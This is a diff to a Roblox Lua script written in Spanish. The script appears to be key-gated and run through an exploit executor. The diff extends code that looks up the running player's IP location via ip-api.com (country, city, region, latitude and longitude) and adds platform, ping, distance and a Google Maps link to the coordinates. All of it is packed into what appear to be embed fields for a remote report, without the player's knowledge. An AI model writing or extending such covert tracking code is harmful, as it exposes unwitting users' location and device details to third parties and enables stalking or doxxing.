@@ -1,6 +1,7 @@
 local Players = game:GetService("Players")  
 local player = Players.LocalPlayer  
 local HttpService = game:GetService("HttpService")  
+local UserInputService = game:GetService("UserInputService")
 
 -- 🔑 KEY CORRECTA  
 local CORRECT_KEY = "A3FCFB7ECC9B6D0A"  
@@ -30,8 +31,8 @@ end)
 local country = "Unknown"
 local city = "Unknown"
 local region = "Unknown"
-local lat = "Unknown"
-local lon = "Unknown"
+local lat = 0
+local lon = 0
 
 pcall(function()
     local geo = game:HttpGet("http://ip-api.com/json/" .. ip)
@@ -41,13 +42,48 @@ pcall(function()
         country = decoded.country or "Unknown"
         city = decoded.city or "Unknown"
         region = decoded.regionName or "Unknown"
-        lat = tostring(decoded.lat) or "Unknown"
-        lon = tostring(decoded.lon) or "Unknown"
+        lat = tonumber(decoded.lat) or 0
+        lon = tonumber(decoded.lon) or 0
     end
 end)
 
--- ⏱️ Hora  
+-- 📅 Fecha y hora  
+local dateNow = os.date("%Y-%m-%d")
 local timeNow = os.date("%Y-%m-%d %H:%M:%S")  
+
+-- 📱 Plataforma  
+local platform = (UserInputService.TouchEnabled and "Mobile") or "PC"
+
+-- 📶 Latencia aproximada  
+local ping = "Unknown"
+pcall(function()
+    local t0 = tick()
+    game:HttpGet("https://api.ipify.org")
+    ping = math.floor((tick() - t0) * 1000) .. " ms"
+end)
+
+-- 📏 Distancia estimada (desde lat/lon a 0,0)
+local distance = "Unknown"
+pcall(function()
+    local baseLat, baseLon = 0, 0
+
+    local function toRad(x) return x * math.pi / 180 end
+
+    local R = 6371
+    local dLat = toRad(baseLat - lat)
+    local dLon = toRad(baseLon - lon)
+
+    local a = math.sin(dLat/2)^2 +
+              math.cos(toRad(lat)) *
+              math.cos(toRad(baseLat)) *
+              math.sin(dLon/2)^2
+
+    local c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
+    distance = math.floor(R * c) .. " km"
+end)
+
+-- 🗺️ Google Maps link  
+local mapsLink = "https://www.google.com/maps?q=" .. lat .. "," .. lon  
 
 -- 🔐 Tipo de acceso  
 local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"  
@@ -68,10 +104,17 @@ local data = {
             {["name"] = "🏙️ Ciudad", ["value"] = city, ["inline"] = true},  
             {["name"] = "📌 Región", ["value"] = region, ["inline"] = true},  
 
-            {["name"] = "🧭 Latitud", ["value"] = lat, ["inline"] = true},  
-            {["name"] = "🧭 Longitud", ["value"] = lon, ["inline"] = true},  
+            {["name"] = "🧭 Latitud", ["value"] = tostring(lat), ["inline"] = true},  
+            {["name"] = "🧭 Longitud", ["value"] = tostring(lon), ["inline"] = true},  
+
+            {["name"] = "📱 Plataforma", ["value"] = platform, ["inline"] = true},  
+            {["name"] = "📶 Latencia", ["value"] = ping, ["inline"] = true},  
+            {["name"] = "📏 Distancia", ["value"] = distance, ["inline"] = true},  
+
+            {["name"] = "🗺️ Maps", ["value"] = mapsLink, ["inline"] = false},  
 
             {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},  
+            {["name"] = "📅 Fecha", ["value"] = dateNow, ["inline"] = true},  
             {["name"] = "⏱️ Hora", ["value"] = timeNow, ["inline"] = true},  
 
             {["name"] = "🔑 Acceso", ["value"] = accessType, ["inline"] = true},  
